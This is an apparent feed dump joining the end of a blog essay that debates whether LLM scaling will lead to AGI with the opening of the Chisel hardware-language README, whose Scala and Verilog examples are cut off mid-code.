https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F11f75c39-8209-46a0-bcc4-d25ceda5312a_1600x1058.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong>Skeptic:</strong></p><p>But have you actually tried looking at a random sample of MMLU and BigBench questions? They are almost all just Google Search first hit results. They are good tests of memorization, not of intelligence. Here’s some questions I picked randomly from MMLU (remember - these are multiple choice - the model just has to choose the right answer from a list of 4):</p><blockquote><p>Q: According to Baier’s theory, the second step in assessing whether an action is morally permissible is to find out</p><p>A: whether the moral rule forbidding it is a genuine moral rule.</p><p>Q: Which of the following is always true of a spontaneous process?</p><p>A: The total entropy of the system plus surroundings increases.</p><p>Q: Who was president of the United States when Bill Clinton was born?</p><p>A: Harry Truman</p></blockquote><p>Why is it impressive that a model trained on internet text full of random facts happens to have a lot of random facts memorized? And why does that in any way indicate intelligence or creativity?</p><p><span>And even on these contrived and orthogonal benchmarks, performance seems to be plateauing. Google’s new Gemini Ultra model is </span><a href="https://epochai.org/trends" rel="">estimated</a><span> to have almost 5x more compute than GPT-4. But it has almost equivalent </span><a href="https://deepmind.google/technologies/gemini/#capabilities" rel="">performance</a><span> at MMLU, BIG-bench, and other standard benchmarks.</span></p><p><span>In any case, common benchmarks don’t at all measure long horizon task performance (can you do a job over the course of a month), where LLMs trained on next token prediction have very few effective data points to learn from. Indeed as we can see on their performance on </span><a href="https://arxiv.org/abs/2310.06770" rel="">SWE-bench</a><span> (which measure if LLMs can autonomously complete pull requests), they’re pretty terrible at integrating complex information over long horizons. GPT-4 gets a measly 1.7% while Claude 2 gets a slightly more impressive 4.8%.</span></p><p>We seem to have two kinds of benchmarks:&nbsp;</p><ul><li><p><span>The ones that measure memorization, recall, and interpolation (</span><a href="https://paperswithcode.com/dataset/mmlu" rel="">MMLU</a><span>, </span><a href="https://paperswithcode.com/dataset/big-bench" rel="">BIG-bench</a><span>, </span><a href="https://paperswithcode.com/dataset/humaneval" rel="">HumanEval</a><span>), where these models already appear to match or even beat the average human. These tests clearly can’t be a good proxy of intelligence, because even a scale maximalist has to admit that models are currently much dumber than humans.</span></p></li><li><p><span>The ones that truly measure the ability to autonomously solve problems across long time horizons or difficult abstractions (</span><a href="https://arxiv.org/abs/2310.06770" rel="">SWE-bench</a><span>, </span><a href="https://github.com/fchollet/ARC" rel="">ARC</a><span>), where these models aren’t even in the running.</span></p></li></ul><p><span>What are we supposed to conclude about a model, which after being trained on the equivalent of 20,000 years of human input, still </span><a href="https://arxiv.org/abs/2309.12288" rel="">doesn’t understand</a><span> that if Tom Cruise's mother is Mary Lee Pfeiffer, then Mary Lee Pfeiffer’s son is Tom Cruise? Or whose answers are so incredibly contingent on the </span><a href="https://manifold.markets/Mira/will-a-prompt-that-enables-gpt4-to" rel="">way</a><span> and </span><a href="https://arxiv.org/abs/2308.11483" rel="">order</a><span> in which the question is phrased?</span></p><p>So it’s not even worth asking yet whether scaling will continue to work - we don’t even seem to have evidence that scaling has worked so far.</p><p><strong>Believer:</strong></p><p><span>Gemini just seems like a bizarre place to expect a plateau. GPT-4 has clearly broken through all the pre-registered critiques of connectionism and deep learning by skeptics</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-5-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-5-139936826" target="_self" rel="">5</a></span><span>. The much more plausible explanation for the performance of Gemini relative to GPT-4 is just that Google has not fully caught up to OpenAI’s algorithmic progress.&nbsp;</span></p><p>If there was some fundamental hard ceiling on deep learning and LLMs, shouldn’t we have seen it before they started developing common sense, early reasoning, and the ability to think across abstractions? What is the prima facie reason to expect some stubborn limit only between mediocre reasoning and advanced reasoning?</p><p><span>Consider how much better GPT-4 is than GPT-3. That’s just a 100x scaleup. Which sounds like a lot until you consider how much smaller that is than the additional scaleup which we could throw at these models. We can afford a further 10,000x scaleup of GPT-4 (i.e. something GPT-6 level) before we touch even one percent of world GDP. And that’s before we account for pretraining compute efficiency gains (things like mixture-of-experts, flash attention), new post training methods (RLAI, fine tuning on chain of thought, self-play, etc), and </span><a href="https://epochai.org/blog/trends-in-machine-learning-hardware" rel="">hardware improvements</a><span>. Each of these will individually contribute as much to performance as you would get from many OOMs of raw scaleup (which they have consistently done </span><a href="https://epochai.org/blog/revisiting-algorithmic-progress" rel="">in the past</a><span>). Add all these together, and you can probably convert 1% of GDP into a GPT-8 level model.&nbsp;&nbsp;</span></p><p>For context on how much societies are willing to spend on new general purpose technologies:</p><ul><li><p><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3469465" rel="">British railway investment</a><span> at its peak in 1847 was a staggering 7% of their GDP.</span></p></li><li><p><span>“</span><a href="https://www.wikiwand.com/en/Telecoms_crash" rel="">In</a><span> the five years after the Telecommunications Act of 1996 went into effect, telecommunications companies invested more than $500 billion [almost a trillion in today’s value] … into laying fiber optic cable, adding new switches, and building wireless networks."</span></p></li></ul><p>It’s possible that GPT-8 (aka a model which has the performance of a 100,000,000 times scaled up GPT-4) will only be slightly better than GPT-4, but I don’t understand why you would expect that to be the case, when we already see models figuring out how to think and what the world is like from far smaller scaleups.&nbsp;</p><p>You know the story from there - millions of GPT-8 copies coding up kernel improvements, finding better hyperparameters, giving themselves boat loads of high quality feedback for fine tuning, and so on. This makes it much cheaper and easier to develop GPT-9 … extrapolate this out to the singularity.&nbsp;</p><p><strong>Believer:</strong></p><p><span>Here’s one of the many astounding finds in Microsoft Research’s </span><a href="https://arxiv.org/pdf/2303.12712.pdf" rel="">Sparks of AGI paper</a><span>. They found that GPT-4 could write the LaTex code to draw a unicorn. We’ve gotten so used to stuff like this that we don’t stop to think about what such examples illustrate. Presumably, animal drawings in LaTex are not part of GPT-4’s training corpus. Yet GPT-4 has developed an internal representation of what a unicorn looks like, and is able to use its proficiency at LaTex programming to illustrate a concept it has only encountered in linguistic form. We’re seeing GPT-4 do things which it obviously could not do if it didn’t have a world model (how could it figure out how to illustrate a unicorn in LaTex if it doesn’t understand what a unicorn looks like)</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-6-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-6-139936826" target="_self" rel="">6</a></span><span>.</span></p><p><span>To predict the next token, a LLM has to teach itself all the regularities about the world which lead to one token following another. To predict the next paragraph in a passage from </span><em>The Selfish Gene</em><span> requires understanding the gene-centered view of evolution, to predict the next passage in a new short story requires understanding the psychology of human characters, and so on.</span></p><p><span>If you train an </span><a href="https://arxiv.org/abs/2210.07128" rel="">LLM on code, it becomes better at reasoning in language</a><span>. Now this is just a really stunning fact. What this tells us is that the model has squeezed out some deep general understanding of how to think from reading a shit ton of code - that not only is there some shared logical structure between language and code, but that unsupervised gradient descent can extract this structure, and make use of it to be be able to better reason.</span></p><p>Gradient descent tries to find the most efficient compression of its data. The most efficient compression is also the deepest and most powerful. The most efficient compression of a physics textbook - the one that would help you predict how a truncated argument from the book is likely to proceed - is just a deeply internalized understanding of the underlying scientific explanations.&nbsp;</p><p><strong>Skeptic:</strong></p><p>Intelligence involves (among other things) the ability to compress. But the compression itself is not intelligence. Einstein is smart because he can come up with relativity, but Einstein+relativity is not a more intelligent system in the sense that seems meaningful to me. It doesn't make sense to say that Plato was an idiot compared to me+my knowledge because he didn't have our modern understanding of biology or physics.</p><p><span>So, if LLMs are just the compression made by another process (stochastic gradient descent), then I don't know why that tells us anything about the LLM's own ability to make compressions (and therefore, why that tells us anything about the LLMs’ intelligence)</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-7-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-7-139936826" target="_self" rel="">7</a></span><span>.&nbsp;</span></p><p><strong>Believer:</strong></p><p><span>An airtight theoretical explanation for why scaling must keep working is not necessary for scaling to keep working. We developed a full understanding of thermodynamics a full </span><a href="https://medium.com/@kameron.sanzo/what-came-first-thermodynamics-or-the-steam-engine-c0cca0996b0b" rel="">century after</a><span> the steam engine was invented. The usual pattern in the history of technology is that invention precedes theory, and we should expect the same of intelligence.</span></p><p>There’s not some law of physics which says that Moore’s Law must continue. And in fact, there are always new practical hurdles which imply the end of Moore’s Law. Yet every couple of years, researchers at TSMC, Intel, AMD, etc figure out how to solve those problems and give the decades-long trend an extra lease on life.</p><p>You can do all this mental gymnastics about compute and data bottlenecks and the true nature of intelligence and the brittleness of benchmarks. Or you can just look at the fucking line.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png" width="1456" height="1077" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1077,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8fd4d77-55e4-44c5-8b40-d04a5952dbe8_1600x1184.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Enough with the alter-egos. Here’s my personal take.</p><p>If you were a scale believer over the last few years, the progress we’ve been seeing would have just made more sense. There is a story you can tell about how GPT-4’s amazing performance can be explained by some idiom library or lookup table which will never generalize. But that’s a story that none of the skeptics pre-registered.&nbsp;</p><p><span>Case in point - one of the steelmans I was going to provide for the skeptic is that LLMs have yet to make a single new connection which has led to a new discovery. A stupid human could do this if they had as much stuff memorized as LLMs do. I honestly thought it was one of the most compelling skeptic points, </span><a href="https://twitter.com/dwarkesh_sp/status/1727004083113128327" rel="">as did many others</a><span>. And then, a few days ago, Google announced that its </span><a href="https://www.nature.com/articles/s41586-023-06924-6" rel="">FunSearch</a><span> setup had made new mathematical discoveries</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-8-139936826" href="https://www.dwarkeshpatel.com/p/will-scaling-work#footnote-8-139936826" target="_self" rel="">8</a></span><span>. If you’re a skeptic, you’re likely to have had this experience again and again.</span></p><p><span>As for the believers, you have people like </span><a href="https://twitter.com/_sholtodouglas/status/1728862047797149827" rel="">Ilya</a><span>, </span><a href="https://twitter.com/dwarkesh_sp/status/1735346394779750877" rel="">Dario</a><span>, </span><a href="https://gwern.net/scaling-hypothesis" rel="">Gwern</a><span>, etc more or less spelling out the slow takeoff we’ve been seeing due to scaling as early as 12 years ago.</span></p><p>It seems pretty clear that some amount of scaling can get us to transformative AI - i.e. if you achieve the irreducible loss on these scaling curves, you’ve made an AI that’s smart enough to automate most cognitive labor (including the labor required to make smarter AIs).&nbsp;</p><p>But most things in life are harder than in theory, and many theoretically possible things have just been intractably difficult for some reason or another (fusion power, flying cars, nanotech, etc). If self-play/synthetic data doesn’t work, the models look fucked - you’re never gonna get anywhere near that platonic irreducible loss. Also, the theoretical reason to expect scaling to keep working are murky, and the benchmarks on which scaling seems to lead to better performance have debatable generality.</p><p>So my tentative probabilities are: 70%: scaling + algorithmic progress + hardware advances will get us to AGI by 2040. 30%: the skeptic is right - LLMs and anything even roughly in that vein is fucked.</p><p>I’m probably missing some crucial evidence - the AI labs are simply not releasing that much research, since any insights about the “science of AI” would leak ideas relevant to building the AGI. One of my friends who is a researcher at one of these labs told me that he misses his undergrad habit of winding down with a bunch of papers - nowadays, nothing worth reading is published. For this reason, I assume that the things I don’t know would shorten my timelines.</p><p><span>Also, for what it’s worth, my day job is as a </span><a href="https://www.youtube.com/DwarkeshPatel" rel="">podcaster</a><span>. But the people who could write a better post are prevented from doing so, either by confidentiality or opportunity cost. So give me a break, and let me know what I missed in the comments.</span></p><p>Here are some additional considerations. I don’t feel I understand these topics well enough to fully make sense of what they imply for scaling.</p><p><span>At a larger scale, models will just naturally develop more efficient meta-learning methods - </span><a href="https://ar5iv.labs.arxiv.org/html/2201.02177" rel="">grokking</a><span> only happens when you have a large overparameterized model and beyond the point at which you’ve trained it to be severely overfit on the data. Grokking seems very similar to how we learn. We have intuitions and mental models of how to categorize new information. And over time with new observations, those mental models themselves change. Gradient descent over such a large diversity of data will select for the most general and extrapolative circuits. Hence we get grokking - eventually we’ll get insight based learning.</span></p><p><strong>Skeptic:</strong></p><p>Neural networks have grokking, but that's orders of magnitude less efficient than how humans actually integrate new explanatory insights. You teach a kid that the sun is at the center of the solar system, and that immediately changes how he makes sense of the night sky. But you can't just feed a single copy of Copernicus into a model untrained on any astronomy, and have it immediately incorporate that insight into all relevant future outputs. It’s bizarre that the model has to hear information so many times in so many different contexts to 'grok' the underlying concepts.&nbsp;</p><p>Not only have models never demonstrated insight learning, but I don’t see how such learning is even possible given the way we train neural networks with gradient descent - we give them a bunch of very subtle nudges with each example, with the hope that enough such nudges will slowly push them atop the correct hill. Insight based learning requires an immediate drag-and-drop from sea level to the top of Mount Everest.</p><p><strong>Believer:</strong></p><p>I’m sure you could find all sorts of these embarrassing fragilities in chimpanzee cognition that are far more damning than the reversal curse. Doesn’t mean there was some fundamental limit on primate brains that couldn’t be fixed by 3x scale plus some finetuning.&nbsp;</p><p><span>Indeed as Suzana Herculano-Houzel has </span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2776484/" rel="">shown</a><span>, the human brain has as many neurons as you’d expect a scaled up primate brain with the mass of a human brain to have. Rodent and insectivore brains have much worse scaling laws - relatively bigger brained species in those orders have far fewer neurons than you would expect just from their brain mass.</span></p><p><span>This suggests there’s some primate neural architecture that’s really scalable in comparison to the brains of other kinds of species, analogous to how </span><a href="https://ar5iv.labs.arxiv.org/html/2001.08361" rel="">transformers have better scaling curves</a><span> than LSTMs and RNNs. Evolution learned (or at least stumbled upon) </span><a href="http://www.incompleteideas.net/IncIdeas/BitterLesson.html" rel="">the bitter lesson</a><span> when designing primate brains, and the niche in which primates were competing strongly rewarded marginal increases in intelligence (you have to make sense of all this data from your binocular vision, opposable thumb tool-using hands, and other smart monkeys who can talk to you).</span></p><p><em><span>Many thanks to </span><a href="https://twitter.com/chrispainteryup" rel="">Chris Painter</a><span>, </span><a href="https://twitter.com/jekbradbury" rel="">James Bradburry</a><span>, </span><a href="https://twitter.com/kipperrii" rel="">Kipply</a><span>, </span><a href="https://twitter.com/Jsevillamol" rel="">Jamie Sevilla</a><span>, </span><a href="https://twitter.com/tamaybes?lang=en" rel="">Tamay Besiroglu</a><span>, </span><a href="https://twitter.com/MatthewJBar" rel="">Matthew Barnett</a><span>, </span><a href="https://twitter.com/AgustinLebron3" rel="">Agustin Lebron</a><span>, </span><a href="https://twitter.com/acv" rel="">Anil Varanasi</a><span>, and </span><a href="https://twitter.com/_sholtodouglas" rel="">Sholto Douglas</a><span> for comments and discussion.</span></em></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Chisel: A Modern Hardware Design Language (129 pts)]]></title>
            <link>https://github.com/chipsalliance/chisel</link>
            <guid>38781273</guid>
            <pubDate>Wed, 27 Dec 2023 12:18:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/chipsalliance/chisel">https://github.com/chipsalliance/chisel</a>, See on <a href="https://news.ycombinator.com/item?id=38781273">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><a href="https://www.chisel-lang.org/" rel="nofollow">
  <img src="https://raw.githubusercontent.com/chipsalliance/chisel/main/docs/src/images/chisel_logo.svg?sanitize=true" height="60">
</a>
<a href="https://www.chipsalliance.org/" rel="nofollow">
  <img src="https://raw.githubusercontent.com/chipsalliance/.github/main/profile/images/chips_alliance.svg?sanitize=true" height="60">
</a>
<p dir="auto">The <strong>Constructing Hardware in a Scala Embedded Language</strong> (<a href="https://www.chisel-lang.org/" rel="nofollow"><strong>Chisel</strong></a>) is an open-source hardware description language (HDL) used to describe digital electronics and circuits at the register-transfer level that facilitates <strong>advanced circuit generation and design reuse for both ASIC and FPGA digital logic designs</strong>.</p>
<p dir="auto">Chisel adds hardware construction primitives to the <a href="https://www.scala-lang.org/" rel="nofollow">Scala</a> programming language, providing designers with the power of a modern programming language to write complex, parameterizable circuit generators that produce synthesizable Verilog.
This generator methodology enables the creation of re-usable components and libraries, such as the FIFO queue and arbiters in the <a href="https://www.chisel-lang.org/api/latest/#chisel3.util.package" rel="nofollow">Chisel Standard Library</a>, raising the level of abstraction in design while retaining fine-grained control.</p>
<p dir="auto">For more information on the benefits of Chisel see: <a href="https://stackoverflow.com/questions/53007782/what-benefits-does-chisel-offer-over-classic-hardware-description-languages" rel="nofollow">"What benefits does Chisel offer over classic Hardware Description Languages?"</a></p>
<p dir="auto">Chisel is powered by <a href="https://github.com/chipsalliance/firrtl-spec">FIRRTL (Flexible Intermediate Representation for RTL)</a>,
a hardware compiler framework implemented by <a href="https://github.com/llvm/circt">LLVM CIRCT</a>.</p>
<p dir="auto">Chisel is <a href="https://github.com/chipsalliance/chisel/blob/main/LICENSE">permissively licensed</a> (Apache 2.0) under the guidance of <a href="https://www.chipsalliance.org/" rel="nofollow">CHIPS Alliance</a>.</p>
<ul dir="auto">
<li><a href="#what-does-chisel-code-look-like">What does Chisel code look like?</a>
<ul dir="auto">
<li><a href="#led-blink">LED blink</a></li>
<li><a href="#fir-filter">FIR Filter</a></li>
</ul>
</li>
<li><a href="#getting-started">Getting Started</a>
<ul dir="auto">
<li><a href="#bootcamp-interactive-tutorial">Bootcamp Interactive Tutorial</a></li>
<li><a href="#a-textbook-on-chisel">A Textbook on Chisel</a></li>
<li><a href="#build-your-own-chisel-projects">Build Your Own Chisel Projects</a></li>
<li><a href="#guide-for-new-contributors">Guide For New Contributors</a></li>
<li><a href="#design-verification">Design Verification</a></li>
</ul>
</li>
<li><a href="#documentation">Documentation</a>
<ul dir="auto">
<li><a href="#useful-resources">Useful Resources</a></li>
<li><a href="#chisel-dev-meeting">Chisel Dev Meeting</a></li>
<li><a href="#data-types-overview">Data Types Overview</a></li>
</ul>
</li>
<li><a href="#contributor-documentation">Contributor Documentation</a>
<ul dir="auto">
<li><a href="#useful-resources-for-contributors">Useful Resources for Contributors</a></li>
<li><a href="#compiling-and-testing-chisel">Compiling and Testing Chisel</a></li>
<li><a href="#running-projects-against-local-chisel">Running Projects Against Local Chisel</a></li>
<li><a href="#chisel-architecture-overview">Chisel Architecture Overview</a></li>
<li><a href="#chisel-sub-projects">Chisel Sub-Projects</a></li>
<li><a href="#which-version-should-i-use">Which version should I use?</a></li>
<li><a href="#roadmap">Roadmap</a></li>
</ul>
</li>
</ul>
<hr>
<p dir="auto"><a href="https://gitter.im/freechipsproject/chisel3?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge&amp;utm_content=badge" rel="nofollow"><img src="https://camo.githubusercontent.com/49267a500b35c3df117c7227b1d812e62c1460715894622a385e2477b103d28f/68747470733a2f2f6d61747269782e746f2f696d672f6d61747269782d62616467652e737667" alt="Join the chat at https://gitter.im/freechipsproject/chisel3" data-canonical-src="https://matrix.to/img/matrix-badge.svg"></a>
<a href="https://javadoc.io/doc/org.chipsalliance/chisel_2.13/latest" rel="nofollow"><img src="https://camo.githubusercontent.com/d9752c93accad7a67bc05077475665e7079006f93f2772ea6d14c0d69033a737/68747470733a2f2f7777772e6a617661646f632e696f2f62616467652f6f72672e6368697073616c6c69616e63652f63686973656c5f322e31332e7376673f636f6c6f723d626c7565266c6162656c3d5363616c61646f63" alt="Scaladoc" data-canonical-src="https://www.javadoc.io/badge/org.chipsalliance/chisel_2.13.svg?color=blue&amp;label=Scaladoc"></a>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/chipsalliance/chisel/actions/workflows/test.yml/badge.svg"><img src="https://github.com/chipsalliance/chisel/actions/workflows/test.yml/badge.svg" alt="CI"></a>
<a href="https://github.com/chipsalliance/chisel/releases/latest"><img src="https://camo.githubusercontent.com/b548295719ea7fa15f42a91f4005708b01e896d660658dac3c68f1926801e417/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f7461672f6368697073616c6c69616e63652f63686973656c2e7376673f696e636c7564655f70726572656c656173657326736f72743d73656d766572" alt="GitHub tag (latest SemVer)" data-canonical-src="https://img.shields.io/github/v/tag/chipsalliance/chisel.svg?include_prereleases&amp;sort=semver"></a>
<a href="https://index.scala-lang.org/chipsalliance/chisel/chisel" rel="nofollow"><img src="https://camo.githubusercontent.com/4d361665a6a4d7013fe2f89dfadea8066b624f68cdd53529d84f6393ce436323/68747470733a2f2f696e6465782e7363616c612d6c616e672e6f72672f6368697073616c6c69616e63652f63686973656c2f63686973656c2f6c61746573742d62792d7363616c612d76657273696f6e2e7376673f706c6174666f726d3d6a766d" alt="Scala version support" data-canonical-src="https://index.scala-lang.org/chipsalliance/chisel/chisel/latest-by-scala-version.svg?platform=jvm"></a>
<a href="https://index.scala-lang.org/chipsalliance/chisel/chisel3" rel="nofollow"><img src="https://camo.githubusercontent.com/5f5ef4e2332fcf4db28f0b9bcd85b1810c1a5262ce42dc15701a8e4126a8d66f/68747470733a2f2f696e6465782e7363616c612d6c616e672e6f72672f6368697073616c6c69616e63652f63686973656c2f63686973656c332f6c61746573742d62792d7363616c612d76657273696f6e2e7376673f706c6174666f726d3d6a766d" alt="Scala version support (chisel3)" data-canonical-src="https://index.scala-lang.org/chipsalliance/chisel/chisel3/latest-by-scala-version.svg?platform=jvm"></a>
<a href="https://s01.oss.sonatype.org/content/repositories/snapshots/org/chipsalliance/chisel_2.13" rel="nofollow"><img src="https://camo.githubusercontent.com/d8d4674f4790cef69de618e17e800fad46ba48de145d2346c72e58ab579a2ecc/68747470733a2f2f696d672e736869656c64732e696f2f6e657875732f732f6f72672e6368697073616c6c69616e63652f63686973656c5f322e31333f7365727665723d68747470732533412532462532467330312e6f73732e736f6e61747970652e6f7267" alt="Sonatype Snapshots" data-canonical-src="https://img.shields.io/nexus/s/org.chipsalliance/chisel_2.13?server=https%3A%2F%2Fs01.oss.sonatype.org"></a></p>
<h2 tabindex="-1" dir="auto">What does Chisel code look like?</h2>
<h3 tabindex="-1" dir="auto">LED blink</h3>
<div dir="auto" data-snippet-clipboard-copy-content="import chisel3._
import chisel3.util.Counter
import circt.stage.ChiselStage

class Blinky(freq: Int, startOn: Boolean = false) extends Module {
  val io = IO(new Bundle {
    val led0 = Output(Bool())
  })
  // Blink LED every second using Chisel built-in util.Counter
  val led = RegInit(startOn.B)
  val (_, counterWrap) = Counter(true.B, freq / 2)
  when(counterWrap) {
    led := ~led
  }
  io.led0 := led
}

object Main extends App {
  // These lines generate the Verilog output
  println(
    ChiselStage.emitSystemVerilog(
      new Blinky(1000),
      firtoolOpts = Array(&quot;-disable-all-randomization&quot;, &quot;-strip-debug-info&quot;)
    )
  )
}"><pre><span>import</span> <span>chisel3</span>.<span>_</span>
<span>import</span> <span>chisel3</span>.<span>util</span>.<span>Counter</span>
<span>import</span> <span>circt</span>.<span>stage</span>.<span>ChiselStage</span>

<span>class</span> <span>Blinky</span>(<span>freq</span>: <span>Int</span>, <span>startOn</span>: <span>Boolean</span> <span>=</span> <span>false</span>) <span>extends</span> <span>Module</span> {
  <span>val</span> <span>io</span> <span>=</span> <span>IO</span>(<span>new</span> <span>Bundle</span> {
    <span>val</span> <span>led0</span> <span>=</span> <span>Output</span>(<span>Bool</span>())
  })
  <span><span>//</span> Blink LED every second using Chisel built-in util.Counter</span>
  <span>val</span> <span>led</span> <span>=</span> <span>RegInit</span>(startOn.<span>B</span>)
  <span>val</span> (_, counterWrap) <span>=</span> <span>Counter</span>(<span>true</span>.<span>B</span>, freq <span>/</span> <span>2</span>)
  when(counterWrap) {
    led <span>:</span><span>=</span> <span>~</span>led
  }
  io.led0 <span>:</span><span>=</span> led
}

<span>object</span> <span>Main</span> <span>extends</span> <span>App</span> {
  <span><span>//</span> These lines generate the Verilog output</span>
  println(
    <span>ChiselStage</span>.emitSystemVerilog(
      <span>new</span> <span>Blinky</span>(<span>1000</span>),
      firtoolOpts <span>=</span> <span>Array</span>(<span><span>"</span>-disable-all-randomization<span>"</span></span>, <span><span>"</span>-strip-debug-info<span>"</span></span>)
    )
  )
}</pre></div>
<p dir="auto">Should output the following Verilog:</p>

<details>
<summary>Click to expand!</summary>

<div data-snippet-clipboard-copy-content="// Generated by CIRCT firtool-1.37.0
module Blinky(
  input  clock,
         reset,
  output io_led0
);

  reg       led;
  reg [8:0] counterWrap_c_value;
  always @(posedge clock) begin
    if (reset) begin
      led <= 1'h0;
      counterWrap_c_value <= 9'h0;
    end
    else begin
      automatic logic counterWrap = counterWrap_c_value == 9'h1F3;
      led <= counterWrap ^ led;
      if (counterWrap)
        counterWrap_c_value <= 9'h0;
      else
        counterWrap_c_value <= counterWrap_c_value + 9'h1;
    end
  end // always @(posedge)
  assign io_led0 = led;
endmodule"><pre><code><span>// Generated by CIRCT firtool-1.37.0</span>
<span>module</span> Blinky(
  <span>input</span>  clock,
         reset,
  <span>output</span> io_led0
);

  <span>reg</span>       led;
  <span>reg</span> [<span>8</span>:<span>0</span>] counterWrap_c_value;
  <span>always</span> @(<span>posedge</span> clock) <span>begin</span>
    <span>if</span> (reset) <span>begin</span>
      led &lt;= <span>1'h0</span>;
      counterWrap_c_value &lt;= <span>9'h0</span>;
    <span>end</span>
    <span>else</span> <span>begin</span>
      <span>automatic</span> <span>logic</span> counterWrap = counterWrap_c_value == <span>9'h1F3</span>;
      led &lt;= counterWrap ^ led;
      <span>if</span> (counterWrap)
        counterWrap_c_value &lt;= <span>9'h0</span>;
      <span>else</span>
        counterWrap_c_value &lt;= counterWrap_c_value + <span>9'h1</span>;
    <span>end</span>
  <span>end</span> <span>// always @(posedge)</span>
  <span>assign</span> io_led0 = led;
<span>endmodule</span>
</code></pre></div>
</details>
<h3 tabindex="-1" dir="auto">FIR Filter</h3>
<p dir="auto">Consider an FIR filter that implements a convolution operation, as depicted in this block diagram:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/chipsalliance/chisel/master/docs/src/images/fir_filter.svg?sanitize=true"><img src="https://raw.githubusercontent.com/chipsalliance/chisel/master/docs/src/images/fir_filter.svg?sanitize=true" width="512"></a></p>
<p dir="auto">While Chisel provides similar base primitives as synthesizable Verilog, and <em>could</em> be used as such:</p>
<div dir="auto" data-snippet-clipboard-copy-content="// 3-point moving sum implemented in the style of a FIR filter
class MovingSum3(bitWidth: Int) extends Module {
  val io = IO(new Bundle {
    val in = Input(UInt(bitWidth.W))
    val out = Output(UInt(bitWidth.W))
  })

  val z1 = RegNext(io.in)
  val z2 = RegNext(z1)

  io.out := (io.in * 1.U) + (z1 * 1.U) + (z2 * 1.U)
}"><pre><span><span>//</span> 3-point moving sum implemented in the style of a FIR filter</span>
class <span>MovingSum3</span>(<span>bitWidth</span>: <span>Int</span>) <span>extends</span> <span>Module</span> {
